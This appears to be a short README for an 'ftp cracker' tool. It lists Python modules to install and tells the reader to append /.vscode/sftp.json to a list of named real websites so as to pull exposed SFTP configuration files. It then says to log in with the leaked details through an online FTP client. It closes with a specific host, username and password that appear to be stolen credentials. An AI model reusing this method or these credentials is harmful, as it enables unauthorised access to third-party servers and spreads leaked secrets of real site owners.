install python3 at your device

instaling modules 

pip3 install requests
pip3 install bs4
pip3 install colorama
pip3 install mechanize
pip3 install licensing

for ftp exploit u need add /.vscode/sftp.json at path result

example result ftp cracker 


http://atomosynth.net
http://auditech-innovations.fr
http://barpilot.com
http://blog.casadastorneiras.com.br
http://boatdeckwebsites.com.au

u need add /.vscode/sftp.json

http://atomosynth.net/.vscode/sftp.json
http://auditech-innovations.fr/.vscode/sftp.json
http://barpilot.com/.vscode/sftp.json
http://blog.casadastorneiras.com.br/.vscode/sftp.json
http://boatdeckwebsites.com.au/.vscode/sftp.json

and paste at your browser and go to serach engine and search

"oneline ftp login" and submit 

host : sftp.agentpoint.com.au
port : 21
username : bdweb
password : 4j77Sz2ndcpj

